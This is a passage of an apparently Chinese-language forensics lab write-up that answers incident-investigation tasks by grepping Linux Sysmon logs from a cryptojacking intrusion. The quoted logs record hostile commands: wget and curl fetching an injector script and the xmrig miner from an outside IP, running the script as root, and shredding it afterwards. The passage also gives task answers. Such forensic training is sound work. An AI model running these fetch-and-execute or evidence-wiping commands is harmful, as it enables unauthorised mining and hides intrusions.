SystemTime=&quot;2022-11-24T09:59:47.851002000Z&quot;/&gt;&lt;EventRecordID&gt;76943&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.855&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-70ec-fbf465550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4001&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/wget&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;wget http://44.204.18.94:80/injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-48c4-357f11560000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4000&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;11&lt;/EventID&gt;&lt;Version&gt;2&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;11&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.863982000Z&quot;/&gt;&lt;EventRecordID&gt;76945&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.869&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-70ec-fbf465550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4001&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/wget&lt;/Data&gt;&lt;Data Name=&quot;TargetFilename&quot;&gt;/opt/automation/injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CreationUtcTime&quot;&gt;2022-11-24 09:59:47.869&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.867270000Z&quot;/&gt;&lt;EventRecordID&gt;76947&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.872&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-e091-5b045a550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4002&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/bin/chmod&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;chmod +x injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-48c4-357f11560000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4000&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.869152000Z&quot;/&gt;&lt;EventRecordID&gt;76949&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.874&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-086e-c8d5d7550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4003&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/sudo&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;sudo ./injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-48c4-357f11560000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4000&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.877825000Z&quot;/&gt;&lt;EventRecordID&gt;76953&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.882&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-4884-6c9bed550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4004&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;/bin/bash ./injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-086e-c8d5d7550000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4003&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/usr/bin/sudo&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;sudo&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:49.343163000Z&quot;/&gt;&lt;EventRecordID&gt;77196&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:49.344&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4095-637f-505f-8d8aca550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4091&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/shred&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;shred -u ./injector.sh&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-4884-6c9bed550000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4004&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>定位到</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://44.204.18.94:80/injector.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="#task-6" class="hash-link" aria-label="Task 6的直接链接" title="Task 6的直接链接">​</a></h2>
<blockquote>
<p>最初将加密挖矿二进制文件和配置文件下载到了哪里？</p>
</blockquote>
<p>直接以 <code>/usr/bin/curl</code> 作为关键词进行定位</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌─[randark@parrot]─[~/tmp/var/log]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└──╼ $ cat syslog | grep &quot;/usr/bin/curl&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;1&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;1&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.882033000Z&quot;/&gt;&lt;EventRecordID&gt;76954&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.884&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;FileVersion&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Description&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Product&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;Company&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;OriginalFileName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;CommandLine&quot;&gt;curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json&lt;/Data&gt;&lt;Data Name=&quot;CurrentDirectory&quot;&gt;/opt/automation&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;LogonGuid&quot;&gt;{c9eb4a87-0000-0000-0000-000001000000}&lt;/Data&gt;&lt;Data Name=&quot;LogonId&quot;&gt;0&lt;/Data&gt;&lt;Data Name=&quot;TerminalSessionId&quot;&gt;66&lt;/Data&gt;&lt;Data Name=&quot;IntegrityLevel&quot;&gt;no level&lt;/Data&gt;&lt;Data Name=&quot;Hashes&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{c9eb4a87-4093-637f-4884-6c9bed550000}&lt;/Data&gt;&lt;Data Name=&quot;ParentProcessId&quot;&gt;4004&lt;/Data&gt;&lt;Data Name=&quot;ParentImage&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentCommandLine&quot;&gt;/bin/bash&lt;/Data&gt;&lt;Data Name=&quot;ParentUser&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;3&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;3&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.924977000Z&quot;/&gt;&lt;EventRecordID&gt;76955&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.930&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;Protocol&quot;&gt;tcp&lt;/Data&gt;&lt;Data Name=&quot;Initiated&quot;&gt;true&lt;/Data&gt;&lt;Data Name=&quot;SourceIsIpv6&quot;&gt;false&lt;/Data&gt;&lt;Data Name=&quot;SourceIp&quot;&gt;172.31.60.25&lt;/Data&gt;&lt;Data Name=&quot;SourceHostname&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;SourcePort&quot;&gt;42234&lt;/Data&gt;&lt;Data Name=&quot;SourcePortName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;DestinationIsIpv6&quot;&gt;false&lt;/Data&gt;&lt;Data Name=&quot;DestinationIp&quot;&gt;44.204.18.94&lt;/Data&gt;&lt;Data Name=&quot;DestinationHostname&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;DestinationPort&quot;&gt;80&lt;/Data&gt;&lt;Data Name=&quot;DestinationPortName&quot;&gt;-&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:47 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;11&lt;/EventID&gt;&lt;Version&gt;2&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;11&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:47.929626000Z&quot;/&gt;&lt;EventRecordID&gt;76956&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:47.934&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;TargetFilename&quot;&gt;/opt/automation/xmrig&lt;/Data&gt;&lt;Data Name=&quot;CreationUtcTime&quot;&gt;2022-11-24 09:59:47.934&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:48 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;3&lt;/EventID&gt;&lt;Version&gt;5&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;3&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:48.010896000Z&quot;/&gt;&lt;EventRecordID&gt;76957&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:48.016&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data 